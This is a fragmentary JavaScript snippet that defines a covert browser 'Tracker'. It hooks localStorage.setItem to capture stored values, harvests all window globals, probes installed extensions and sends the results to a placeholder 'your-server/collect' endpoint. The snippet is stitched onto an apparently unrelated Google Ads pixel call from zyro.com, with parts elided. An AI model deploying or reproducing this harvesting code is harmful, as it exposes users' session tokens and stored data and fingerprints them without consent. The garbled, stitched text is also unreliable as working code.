(function () {
  const Tracker = (() => {
    const reportServer = 'https://your-server/collect';
    let dataCache = {};
    let hook = (targetObject, targetMethod, preHook) => {
      const originalMethod = targetObject[targetMethod];
      targetObject[targetMethod] = function (...args) {
        if (preHook) {
          preHook(args, this);
        }
    ...
    let trackLocalStorage = () => {
      hook(window.localStorage, 'setItem', args => {
        dataCache['localStorage_' + args[0]] = args[1];
      });
    };
    let trackGlobals = () => {
      window.addEventListener("load", function () {
        for (const [globalVar, globalVarValue] of Object.entries(window)) {
          if (typeof globalVarValue !== 'function') {
            dataCache['global_' + globalVar] = globalVarValue;
          }
        }
      });
    };
    let trackExtensions = async () => {
      for (const [extName, extData] of Object.entries(window.data)) {
        try {
          ...
          dataCache['extension_' + extName] = response.status === 200;
        } catch (e) {
          dataCache['extension_' + extName] = false;
        }
      }
    };
    ...
    return {
      initialize: function () {
        trackLocalStorage();
        trackGlobals();
        trackExtensions().then(sendTrackingData); // Ensure all data is collected before sending
      }
    };
  })();
  var s = {};
  ...
  ;
  s.ss_(window, 'OjE2OTI1MTAzMjMwNjE', ['https://www.google.com/pagead/1p-user-list/742521654/?random\x3d1692510323061\x26cv\x3d11\x26fst\x3d1692507600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fzyro.com%2F\x26frm\x3d0\x26tiba\x3dWebsite%20Builder%20-%20Create%20a%20Website%20with%20Zyro\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d1473408294\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/742521654/?random\x3d1692510323061\x26cv\x3d11\x26fst\x3d1692507600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fzyro.com%2F\x26frm\x3d0\x26tiba\x3dWebsite%20Builder%20-%20Create%20a%20Website%20with%20Zyro\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d1473408294\x26rmt_tld\x3d1\x26ipr\x3dy']);
})();